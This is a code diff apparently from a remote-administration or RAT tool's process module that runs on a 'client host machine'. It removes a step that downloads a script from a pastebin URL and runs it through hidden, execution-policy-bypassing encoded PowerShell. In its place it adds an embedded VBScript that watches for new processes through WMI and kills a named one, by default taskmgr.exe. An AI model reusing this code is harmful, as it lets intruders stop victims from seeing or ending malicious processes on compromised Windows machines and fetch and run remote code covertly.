@@ -6,6 +6,7 @@
 import os
 import json
 import time
+import string
 import base64
 import urllib
 import threading
@@ -26,6 +27,16 @@ description = """
 List/search/kill currently running processes on the client host machine
 """
 log = StringIO()
+template_block = string.Template("""On Error Resume Next
+Set objWshShl = WScript.CreateObject("WScript.Shell")
+Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!//./root/cimv2")
+Set colMonitoredProcesses = objWMIService.ExecNotificationQuery("select * from __instancecreationevent " & " within 1 where TargetInstance isa 'Win32_Process'")
+Do
+    Set objLatestProcess = colMonitoredProcesses.NextEvent
+    If objLatestProcess.TargetInstance.Name = "${PROCESS}" Then
+        objLatestProcess.TargetInstance.Terminate
+        End If
+Loop""")
 
 # main
 def _monitor(keyword):
@@ -156,15 +167,10 @@ def block(process_name='taskmgr.exe'):
     :param str process_name:    process name to block (default: taskmgr.exe)
 
     """
+    global template_block
     try:
-        code = urllib.urlopen('https://pastebin.com/raw/GYFAzpy3').read().replace('__PROCESS__', process_name)
-        if os.path.isfile(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe'):
-            powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe'
-        elif os.path.isfile(os.popen('where powershell').read().rstrip()):
-            powershell = os.popen('where powershell').read().rstrip()
-        else:
-            return "Error: unable to find powershell.exe"
-        _ = os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
+        code = template_block.substitute(PROCESS=process_name)
+        _ = util.powershell(code)
         return "Process {} blocked".format(process_name)
     except Exception as e:
         util.log("{} error: {}".format(block.func_name, str(e)))
